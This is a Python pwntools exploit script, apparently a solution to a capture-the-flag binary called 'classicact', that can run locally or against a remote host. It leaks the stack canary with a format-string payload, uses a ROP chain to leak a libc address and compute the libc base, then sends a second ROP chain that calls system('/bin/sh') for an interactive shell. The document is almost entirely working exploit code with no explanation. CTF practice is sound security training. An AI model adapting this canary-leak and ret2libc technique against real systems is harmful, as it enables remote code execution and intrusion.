from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


exe = './classicact'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# libc = elf.libc # Local libc
libc = ELF('libc6_2.31-0ubuntu9.7_amd64.so') # Remote libc

# Start program
io = start()
buffer_size = 72

# Leak canary
io.sendlineafter('name!', b'%19$p')
io.recvlines(2)

canary = int(io.recvline().rstrip(), 16)

# Leak libc printf address and call vuln again
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.vuln()

payload = flat({
buffer_size: [
    canary,
    asm('nop') * 8,
    rop.chain()
    ]
})

io.sendlineafter('today?', payload)
io.recvlines(2) 
c = io.recvline().rstrip()
leaked_libc_address = u64(c.ljust(8, b'\x00'))

libc.address = leaked_libc_address - libc.sym['puts']

io.sendlineafter('name!', b'%19$p')
io.recvlines(2)

canary = int(io.recvline().rstrip(), 16)

# Shell
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
ret_address = rop.find_gadget(['ret']).address

payload = flat({
buffer_size: [
    canary,
    asm('nop') * 8,
    ret_address,
    rop.chain()
    ]
})


io.sendlineafter('today?', payload)
io.interactive()


